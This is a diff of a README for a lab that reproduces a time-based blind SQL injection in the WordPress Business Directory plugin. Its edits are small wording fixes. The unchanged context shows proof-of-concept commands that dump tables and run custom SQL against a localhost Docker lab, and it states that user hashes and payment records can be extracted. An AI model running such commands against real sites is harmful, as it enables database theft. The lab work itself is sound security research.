@@ -139,8 +139,7 @@ observable delay, and `SLEEP(2)` produces ~4 seconds.
 
 ### Impact
 
-An unauthenticated attacker can extract the entire database contents
-character by character, including:
+An unauthenticated attacker can infer and extract database contents character by character through time-based responses, including:
 
 - WordPress user table (`wp_users`), usernames, email addresses, password hashes
 - Plugin payment records, transaction data, listing owner details
@@ -261,7 +260,7 @@ docker compose up -d pma
 
 All commands run from the lab root directory on your Kali host.
 Use `http://localhost:8080` (host → Docker port mapping).
-The `payment_key` must match a real row in `wp_wpbdp_payments`.
+The `payment_key` must correspond to an existing row in `wp_wpbdp_payments`.
 
 ### Detect: confirm the injection exists
 
@@ -298,7 +297,7 @@ python3 poc/poc.py --target http://localhost:8080 --page-id 4 --payment-key seed
 python3 poc/poc.py --target http://localhost:8080 --page-id 4 --payment-key seed-pay-001 --dump-table lab_secrets
 ```
 
-### Custom SQL arbitrary expression
+### Custom SQL Expression Extraction
 
 ```bash
 python3 poc/poc.py --target http://localhost:8080 --page-id 4  --payment-key seed-pay-001 --custom-sql "SELECT secret_value FROM lab_secrets WHERE label='flag'"  
@@ -340,7 +339,7 @@ python3 poc/patch_diff.py
 python3 poc/patch_diff.py --full
 ```
 
-- Or Manual Downlaod
+- Or Manual Download
 ```bash
 # Download both versions
 svn export https://plugins.svn.wordpress.org/business-directory-plugin/tags/6.4.21/ /tmp/v6421
